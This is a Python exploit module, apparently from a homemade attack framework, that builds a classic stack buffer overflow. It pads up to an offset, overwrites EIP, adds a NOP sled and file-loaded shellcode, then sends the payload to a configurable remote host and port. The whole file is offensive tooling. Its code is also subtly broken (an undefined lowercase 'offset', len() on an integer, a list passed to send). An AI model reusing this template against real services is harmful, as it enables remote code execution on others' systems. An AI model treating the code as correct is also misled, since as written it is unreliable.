from core import logger
import socket
import struct
import random
from colorama import *

class Exploit:
	config={
"RHOST": "127.0.0.1",
"RPORT": 4444,
"totalLen": 4000,
"Offset": 2000,
"Nops": 90,
"EipBytes": 0x00800000,
"File": "kes.txt"
	}
	def show_options(self):
		logger.info("Options")
		logger.info("-------")
		for key in sorted(self.config.keys()):
			print(Fore.YELLOW, key,":",self.get_config(key), Style.RESET_ALL)
	

	@staticmethod
	def show_info():
		logger.info("\nThis exploit tries to do a buffer \noverflow to the given ip and port")

	
	def set_config(self, key, value):
		if key in self.config.keys():
			self.config[key] = value
		else:
			logger.error("No options")
	
	
	def get_config(self, key):
		return self.config[key]

	def run(self):

		sock=socket.socket()
		sock.connect((self.config["RHOST"], self.config["RPORT"]))
		Offset=self.config["Offset"]

		shellFile=open(self.config["File"], 'r')
		shellcode=shellFile.read()

		new_eip=struct.pack('<I', self.config["EipBytes"])

		nop="\x90"*self.config["Nops"]

		payload=[
			b"A"*offset,
			new_eip,
			nop,
			b"".join(shellcode),
			b"C"*(self.config["totalLen"] - self.config["Offset"] - len(new_eip) - len(self.config["Nops"]))

		]

		sock.send(payload)
		logger.info("Sent Payload")
		sock.close()
